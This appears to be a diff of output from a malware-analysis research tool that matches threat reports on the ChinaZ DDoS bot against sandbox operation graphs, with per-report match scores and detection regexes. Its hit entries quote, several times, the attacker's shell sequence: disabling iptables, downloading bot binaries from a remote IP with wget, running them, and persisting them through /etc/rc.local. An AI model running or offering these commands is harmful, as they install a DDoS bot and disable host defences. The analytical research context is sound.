@@ -1,30 +1,51 @@
-asg_object: ['.*/selinux', '/.*bin/cat', '/.*bin/ethtool', '/.*bin/grep', '/.*bin/killall', '/.*bin/rm', '/etc/host\\.conf', '/etc/hosts', '/etc/nsswitch\\.conf', '/etc/resolv\\.conf', '/proc/\\d+/stat', '/proc/meminfo', '/proc/net/dev', '/proc/stat', '0x[0-9a-zA-Z]{1,16}', 'Permission', 'Permission:[0-9]{3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^GID.*', '^PID.*', '^UID.*', '^cat$', '^grep$', '^killall$', '^rm$', '^sh$', '^uname$', 'port \\d+']
+asg_object: ['.*/selinux', '/.*bin/cat', '/.*bin/ethtool', '/.*bin/grep', '/.*bin/killall', '/.*bin/rm', '/etc/host\\.conf', '/etc/hosts', '/etc/nsswitch\\.conf', '/etc/resolv\\.conf', '/proc/\\d+/stat', '/proc/meminfo', '/proc/net/dev', '/proc/stat', '/tmp.*', '0x[0-9a-zA-Z]{1,16}', 'Permission', 'Permission:[0-9]{3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+', '^GID.*', '^PID.*', '^UID.*', '^cat$', '^grep$', '^killall$', '^rm$', '^sh$', '^uname$', 'port \\d+']
 
-Sample ChinaZ.csv
-	num of segment in report: 76, 10 of them contain ASG object(s)
-	lenght of ctd's OPset is 6
-	#numofSTobject: 3, numofSTobject sysRrc: 0
+Sample ChinaZ-TrendMicro.csv
+	num of segment in report: 8, 0 of them contain ASG object(s)
+	lenght of ctd's OPset is 0
+	#numofSTobject: 0, numofSTobject sysRrc: 0
 	#R_malObj
-	num of ctd objects: 11, num of asg objects: 297. R_malObj is 0.0370
-		ctd_object: ['0x[0-9a-zA-Z]{1,16}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+']
+	num of ctd objects: 0, num of asg objects: 297. R_malObj is 0.0000
+		ctd_object: []
 	#R_malSysObj
 	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
-		len(asg_OPset): 63, len(ctd_OPset): 6
+		len(asg_OPset): 73, len(ctd_OPset): 0
 	#R_malOps
-	num of matched asg op: 25, num of asg op: 596. R_malOps is 0.0419
-		refered lifecycle: [1, 5, 42]
+	num of matched asg op: 0, num of asg op: 596. R_malOps is 0.0000
+		refered lifecycle: []
 	#R_malChangeOps
-	num of matched asg op: 0, num of asg op: 2. R_malChangeOps is 0.0000
+	num of matched asg op: 0, num of asg op: 3. R_malChangeOps is 0.0000
 		ref-sys lifecycle: []
 
+Sample ChinaZ-ahnlab.csv
+	num of segment in report: 76, 10 of them contain ASG object(s)
+	lenght of ctd's OPset is 7
+	#numofSTobject: 5, numofSTobject sysRrc: 0
+	#R_malObj
+	num of ctd objects: 17, num of asg objects: 297. R_malObj is 0.0572
+		ctd_object: ['/tmp.*', '0x[0-9a-zA-Z]{1,16}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+']
+	#R_malSysObj
+	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
+		len(asg_OPset): 73, len(ctd_OPset): 7
+	#R_malOps
+	num of matched asg op: 27, num of asg op: 596. R_malOps is 0.0453
+		refered lifecycle: [1, 5, 47, 56]
+	#R_malChangeOps
+	num of matched asg op: 2, num of asg op: 3. R_malChangeOps is 0.6667
+		ref-sys lifecycle: [56]
+
 	hits
-	<OP 2 act=brk(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP 5 act=use, obj=0x0000, sent=Offset	Size	Description 0x0000	0x0040	OS version information 0x0040	0x0020	Not used 0x0060	0x0020	CPU performance information 0x0080	0x0020	Not used 0x00A0	0x0020	Not used 0x00C0	0x0010	DDoS attack bandwidth information 0x00D0	0x0010	CPU usage 0x00E0	0x0020	Threat actor’s Mark string>
-	<OP 6 act=futex(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP 4 act=stop, obj=0x0100, sent=(“UST”) 0x0100	0x0004	DDoS attack flag (0: Attack in progress, 1: Attack stopped) 0x0104	0x0004	Number of DDoS attacks currently in progress 0x0108	0x0080	Status of DDoS attacks currently in progress Table 2>
-	<OP43 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 2 act=wget, obj=hxxp://45.113.163.219/linux64, sent=# service iptables stop # wget hxxp://45.113.163.219/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 777 linux64 # ./linux64 # chmod 0755 /root/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 0777 linux64 # chmod u+x linux64 # ./linux64 & # chmod u+x linux64 # ./linux64 & # cd /tmp # service iptables stop # wget hxxp://45.113.163.219/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 777 linux32 # ./164 # chmod 0755 /root/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 0777 linux32 # chmod u+x linux32 # ./linux32 & # chmod u+x dos6cc4 # ./linux32 & # cd /tmp # echo “cd /root/”>>/etc/rc.local # echo “./linux64&”>>/etc/rc.local # echo “./linux32&”>>/etc/rc.local # echo “/etc/init.d/iptables stop”>>/etc/rc.local  The threat actor disabled iptables (which is also the firewall), and used wget to install ChinaZ DDoSClient which has been built for x86 and x64 architectures>
+	<OP 2 act=brk(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP 6 act=use, obj=0x0000, sent=Offset	Size	Description 0x0000	0x0040	OS version information 0x0040	0x0020	Not used 0x0060	0x0020	CPU performance information 0x0080	0x0020	Not used 0x00A0	0x0020	Not used 0x00C0	0x0010	DDoS attack bandwidth information 0x00D0	0x0010	CPU usage 0x00E0	0x0020	Threat actor’s Mark string>
+	<OP 6 act=futex(), obj=0x[0-9a-zA-Z]{1,16} (mem)>, <OP 5 act=stop, obj=0x0100, sent=(“UST”) 0x0100	0x0004	DDoS attack flag (0: Attack in progress, 1: Attack stopped) 0x0104	0x0004	Number of DDoS attacks currently in progress 0x0108	0x0080	Status of DDoS attacks currently in progress Table 2>
+	<OP48 act=send(), obj=ip_addr/ip_addr:port/port>, <OP 2 act=wget, obj=hxxp://45.113.163.219/linux64, sent=# service iptables stop # wget hxxp://45.113.163.219/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 777 linux64 # ./linux64 # chmod 0755 /root/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 0777 linux64 # chmod u+x linux64 # ./linux64 & # chmod u+x linux64 # ./linux64 & # cd /tmp # service iptables stop # wget hxxp://45.113.163.219/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 777 linux32 # ./164 # chmod 0755 /root/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 0777 linux32 # chmod u+x linux32 # ./linux32 & # chmod u+x dos6cc4 # ./linux32 & # cd /tmp # echo “cd /root/”>>/etc/rc.local # echo “./linux64&”>>/etc/rc.local # echo “./linux32&”>>/etc/rc.local # echo “/etc/init.d/iptables stop”>>/etc/rc.local  The threat actor disabled iptables (which is also the firewall), and used wget to install ChinaZ DDoSClient which has been built for x86 and x64 architectures>
+	<OP57 act=write(), obj=/tmp.*>, <OP 3 act=cd, obj=/tmp, sent=# service iptables stop # wget hxxp://45.113.163.219/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 777 linux64 # ./linux64 # chmod 0755 /root/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 0777 linux64 # chmod u+x linux64 # ./linux64 & # chmod u+x linux64 # ./linux64 & # cd /tmp # service iptables stop # wget hxxp://45.113.163.219/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 777 linux32 # ./164 # chmod 0755 /root/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 0777 linux32 # chmod u+x linux32 # ./linux32 & # chmod u+x dos6cc4 # ./linux32 & # cd /tmp # echo “cd /root/”>>/etc/rc.local # echo “./linux64&”>>/etc/rc.local # echo “./linux32&”>>/etc/rc.local # echo “/etc/init.d/iptables stop”>>/etc/rc.local  The threat actor disabled iptables (which is also the firewall), and used wget to install ChinaZ DDoSClient which has been built for x86 and x64 architectures>
+
+	sys_hits
+	<OP57 act=write(), obj=/tmp.*>, <OP 3 act=cd, obj=/tmp, sent=# service iptables stop # wget hxxp://45.113.163.219/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 777 linux64 # ./linux64 # chmod 0755 /root/linux64 # nohup /root/linux64 > /dev/null 2>&1 & # chmod 0777 linux64 # chmod u+x linux64 # ./linux64 & # chmod u+x linux64 # ./linux64 & # cd /tmp # service iptables stop # wget hxxp://45.113.163.219/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 777 linux32 # ./164 # chmod 0755 /root/linux32 # nohup /root/linux32 > /dev/null 2>&1 & # chmod 0777 linux32 # chmod u+x linux32 # ./linux32 & # chmod u+x dos6cc4 # ./linux32 & # cd /tmp # echo “cd /root/”>>/etc/rc.local # echo “./linux64&”>>/etc/rc.local # echo “./linux32&”>>/etc/rc.local # echo “/etc/init.d/iptables stop”>>/etc/rc.local  The threat actor disabled iptables (which is also the firewall), and used wget to install ChinaZ DDoSClient which has been built for x86 and x64 architectures>
 
 
 OperationPair that changes system resources:
-[<OP52 act=write(), obj=ip_addr/ip_addr:port/port>, <OP51 act=write(), obj=ip_addr/ip_addr:port/port>]
+[<OP59 act=write(), obj=ip_addr/ip_addr:port/port>, <OP57 act=write(), obj=/tmp.*>, <OP58 act=write(), obj=ip_addr/ip_addr:port/port>, <OP22 act=chdir(), obj=/tmp.*>]
 
 {
     ".*/selinux": [
@@ -93,5 +114,13 @@ OperationPair that changes system resources:
     ],
     "/proc/stat": [
         "/proc/stat"
+    ],
+    "/tmp.*": [
+        "/tmp",
+        "/tmp/.",
+        "/tmp/127.0.0.53:53",
+        "/tmp/45.113.163.219:29134",
+        "/tmp/Meminfo",
+        "/tmp/NetSpeedInfo"
     ]
 }
